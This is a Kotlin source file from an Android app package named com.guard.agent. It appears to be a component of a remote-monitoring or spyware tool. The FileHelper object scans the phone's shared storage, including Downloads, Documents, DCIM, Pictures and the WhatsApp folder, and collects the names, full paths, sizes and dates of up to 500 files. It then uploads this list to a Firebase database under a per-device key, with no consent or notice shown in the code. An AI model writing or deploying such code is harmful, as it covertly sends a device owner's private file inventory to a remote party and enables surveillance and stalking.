package com.guard.agent.helpers.data

import android.content.Context
import android.os.Environment
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger
import java.io.File

object FileHelper {

    private const val TAG = "FileHelper"
    private const val MAX_ITEMS = 500

    fun push(ctx: Context, deviceKey: String) {
        try {
            val list = mutableListOf<Map<String, Any>>()

            // Common folders scan karo
            val roots = listOf(
                Environment.getExternalStorageDirectory(),
                File(Environment.getExternalStorageDirectory(), "Download"),
                File(Environment.getExternalStorageDirectory(), "Documents"),
                File(Environment.getExternalStorageDirectory(), "DCIM"),
                File(Environment.getExternalStorageDirectory(), "Pictures"),
                File(Environment.getExternalStorageDirectory(), "WhatsApp")
            )

            roots.forEach { root ->
                if (root.exists() && root.isDirectory) {
                    scanDir(root, list, 0)
                }
            }

            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_FILES)
                .setValue(
                    mapOf(
                        "count" to list.size,
                        "list" to list,
                        "time" to System.currentTimeMillis()
                    )
                )

            Logger.d(TAG, "Pushed ${list.size} files")
        } catch (e: Exception) {
            Logger.e(TAG, "push failed", e)
        }
    }

    private fun scanDir(dir: File, out: MutableList<Map<String, Any>>, depth: Int) {
        if (depth > 2 || out.size >= MAX_ITEMS) return
        try {
            val files = dir.listFiles() ?: return
            for (f in files) {
                if (out.size >= MAX_ITEMS) return
                if (f.isDirectory) {
                    scanDir(f, out, depth + 1)
                } else {
                    out.add(
                        mapOf(
                            "name" to f.name,
                            "path" to f.absolutePath,
                            "size" to f.length(),
                            "modified" to f.lastModified()
                        )
                    )
                }
            }
        } catch (_: Exception) {}
    }
}
